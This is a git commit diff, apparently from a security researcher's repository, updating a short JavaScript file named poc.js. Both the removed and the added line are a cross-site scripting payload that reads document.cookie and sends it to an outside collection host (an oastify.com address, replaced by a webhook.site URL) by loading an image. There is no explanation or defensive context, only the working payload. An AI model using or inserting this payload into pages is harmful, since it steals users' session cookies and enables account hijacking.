e8aa575a4de3762f0492bc8953395e2876929c96
cyberkill896-sudo <cyberkill896@gmail.com>
2025-09-18 17:42:52 +0530

    Update poc.js

--- poc.js
+++ poc.js
@@ -1,6 +1,7 @@
 // poc.js
-new Image().src = "uhfyvniuwl8xdrdiccuejl8yzp5gt6hv.oastify.com?c=" + encodeURIComponent(document.cookie);
+new Image().src = "https://webhook.site/179030af-9b14-424e-b380-6b8cce8b6544?c=" + encodeURIComponent(document.cookie);
 console.log('poc loaded');
+
 
 
 
